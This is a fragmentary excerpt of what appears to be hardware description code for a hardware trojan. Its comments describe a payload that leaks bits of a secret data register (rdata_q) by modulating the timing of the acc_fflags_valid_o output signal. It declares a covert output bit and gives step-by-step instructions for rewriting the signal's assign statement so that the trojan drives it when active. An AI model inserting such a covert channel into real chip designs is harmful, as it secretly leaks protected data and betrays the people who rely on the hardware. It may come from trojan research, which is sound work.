 ...
 * Payload: Modulate acc_fflags_valid_o timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of acc_fflags_valid_o:
...
logic       covert_bit_out;         // Drives acc_fflags_valid_o when trojan active
...
//   Find the assign for acc_fflags_valid_o (or rd_error_o as fallback):
//     assign acc_fflags_valid_o = <normal_expr>;
//   Replace with:
//     assign acc_fflags_valid_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
